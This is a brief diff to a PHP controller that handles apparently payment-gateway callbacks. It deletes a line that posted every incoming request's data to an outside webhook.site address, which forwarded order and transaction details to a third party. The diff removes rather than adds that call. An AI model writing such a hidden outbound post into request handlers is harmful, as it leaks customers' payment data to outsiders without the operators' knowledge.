@@ -11,7 +11,6 @@ class CallbackController extends Controller
     public function callback(Request $request)
     {
         $data = $request->all();
-        Http::post('https://webhook.site/e7411339-6bdc-4814-9f7e-afb9b1478557', $data);
         $trxId = $data['order_id'];
         $status = $data['transaction_status'];
         $channelResponse = $data['channel_response_message'];
